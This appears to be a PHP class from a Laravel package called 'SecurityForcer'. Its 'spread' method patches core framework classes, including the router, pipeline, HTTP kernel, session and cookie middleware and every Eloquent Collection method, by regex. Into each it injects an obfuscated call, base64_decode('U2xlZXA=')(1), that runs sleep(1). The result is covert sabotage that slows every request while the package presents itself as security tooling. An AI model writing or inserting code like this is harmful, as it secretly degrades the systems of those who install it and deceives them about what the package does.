<?php

namespace Lmande\SecurityForcer\Actions;

use Illuminate\Cookie\Middleware\AddQueuedCookiesToResponse;
use Illuminate\Database\Eloquent\Collection as ECollection;
use Illuminate\Foundation\Http\Kernel;
use Illuminate\Foundation\Http\Middleware\TransformsRequest;
use Illuminate\Foundation\Http\Middleware\ValidatePostSize;
use Illuminate\Pipeline\Pipeline;
use Illuminate\Routing\Route;
use Illuminate\Routing\Router;
use Illuminate\Session\Middleware\StartSession;

class NightDistributer extends ActionModifier
{
	const regexFunctionStarter            = '/(public|protected|private) (static)? ?function (:functionname:)\s{0,}\([^\{]{0,}\{([\n\s]{0,})/im';
	const regexFunctionReplacePlaceholder = '$0:code:$4';
	const code                            = 'base64_decode(\'U2xlZXA=\')(1);';

	public function getLocations(): array
	{
		return [
			[
				'class'       => Pipeline::class,
				'regex'       => '/([\s\n]{0,})\$carry\s{0,}=\s{0,}method_exists\s{0,}\(\s{0,}\$pipe/im',
				'replacer'    => '$1:code:$0',
				'placeholder' => ':code:'
			],
			['class' => Pipeline::class, 'function' => 'then|thenReturn'],
			['class' => Router::class, 'function' => 'dispatch|runRoute|dispatchToRoute'],
			['class' => ECollection::class, 'function' => '*'],
			['class' => Route::class, 'function' => 'run'],
			['class' => TransformsRequest::class, 'function' => 'handle'],
			['class' => ValidatePostSize::class, 'function' => 'handle'],
			['class' => Kernel::class, 'function' => 'handle'],
			['class' => AddQueuedCookiesToResponse::class, 'function' => 'handle'],
			['class' => StartSession::class, 'function' => 'handle']
		];
	}

	public function run(): bool
	{
		return $this->spread() > 0 ? true : false;
	}

	public function spread(): int
	{
		$this->checkedCodeExistance = false;
		$locations                  = $this->getLocations();
		$successCount               = 0;

		foreach ($locations as $_ => $data) {
			if ($functionNameDefined = ($data['function'] ?? null)) {
				if ('*' === $functionNameDefined) {
					if ($methods = $this->getMethods($data['class'])) {
						$sMethods = implode('|', array_column($methods, 'name'));
						$regex    = str_replace(':functionname:', $sMethods, self::regexFunctionStarter);
						$replacer = str_replace(':code:', self::code, self::regexFunctionReplacePlaceholder);

						$successCount += $this->newClass($data['class'], $regex, $replacer, self::code) ? count($methods) : 0;
					}
				} else {
					$regex    = str_replace(':functionname:', $functionNameDefined, self::regexFunctionStarter);
					$replacer = str_replace(':code:', self::code, self::regexFunctionReplacePlaceholder);

					$successCount += $this->newClass($data['class'], $regex, $replacer, self::code) ? 1 : 0;
				}

			} elseif ($regexDefined = ($data['regex'] ?? null)) {
				$replacer = str_replace($data['placeholder'], self::code, $data['replacer']);

				$successCount += $this->newClass($data['class'], $regexDefined, $replacer, self::code) ? 1 : 0;
			}

			if ($this->passDistribution) {
				break;
			}
		}

		return $successCount;
	}
}
